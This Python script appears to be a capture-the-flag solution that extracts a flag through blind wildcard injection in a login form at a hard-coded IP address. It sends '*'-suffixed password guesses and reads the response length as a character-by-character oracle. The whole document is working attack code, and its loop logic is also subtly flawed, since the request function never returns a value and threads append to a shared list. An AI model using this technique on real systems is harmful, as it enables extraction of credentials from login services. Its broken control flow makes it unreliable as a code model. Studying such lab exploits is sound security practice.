#!/usr/bin/env python3
import requests
import string
from concurrent import futures

url = "http://167.172.50.34:30841/login"
leaked_pass = list("HTB{")

# Remove the wildcard character
printable = string.printable.replace('*', '')

# Use a session object for efficient connection reuse
session = requests.Session()

def make_request(character):
    print("Guessing " + ''.join(leaked_pass) + character + "*")
    r = session.post(url, {"username": "*", "password": ''.join(leaked_pass) + character + "*"})
    # print(r.headers['Content-Length'])
    if r.headers['Content-Length'] == '2586':
        leaked_pass.append(character)

# Use multi-threading to make requests concurrently
with futures.ThreadPoolExecutor() as executor:
    while True:
        # Submit requests for each character in parallel
        futures_list = [executor.submit(make_request, character) for character in printable]
        
        # Wait for any future to complete
        completed, _ = futures.wait(futures_list, return_when=futures.FIRST_COMPLETED)

        # Check if any request was successful
        for future in completed:
            if future.result() is not None:
                # Stop the loop if the flag is complete
                if leaked_pass[-1] == '}':
                    exit()
                break
